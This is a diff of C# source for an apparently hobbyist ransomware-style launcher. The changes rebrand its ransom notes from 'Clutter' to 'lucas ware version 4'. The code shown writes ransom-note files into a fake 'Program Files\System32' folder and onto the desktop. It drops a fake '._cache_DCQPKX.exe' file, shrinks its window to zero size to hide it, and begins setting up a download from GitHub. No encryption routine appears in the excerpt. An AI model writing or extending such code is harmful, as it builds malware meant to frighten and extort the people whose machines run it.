@@ -31,7 +31,7 @@ namespace launcher2._0
         {
 
             Directory.CreateDirectory("C:\\Program Files\\System32"); //Create Folder
-            File.WriteAllText("C:\\Program Files\\System32\\README.txt", "You were encrypted by Clutter, good luck..."); //Create text file :-)
+            File.WriteAllText("C:\\Program Files\\System32\\README.txt", "You were encrypted by lucas ware version 4, good luck..."); //Create text file :-)
 
             this.Left = 0; //Make 0 size
             this.Top = 0; //Make 0 size
@@ -46,14 +46,14 @@ namespace launcher2._0
 
                 using (StreamWriter streamWriter = File.CreateText(pathcachefile + @"\._cache_DCQPKX.exe"))
                 {
-                    streamWriter.WriteLine("Ur files has been locked :-)"); //text for file
+                    streamWriter.WriteLine("Ur files has been locked by a lucas ware  :-)"); //text for file
                 }
             }
 
             string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
             using (StreamWriter streamWriter = File.CreateText(path + @"\RANSOMWARE2.0.txt")) //Create file
             {
-                streamWriter.WriteLine("Ur files has been locked :-)"); //Text for file
+                streamWriter.WriteLine("Ur files has been locked by a lucas ware :-)"); //Text for file
             }
 
             ServicePointManager.Expect100Continue = true; //Make protocol for donwload file from github
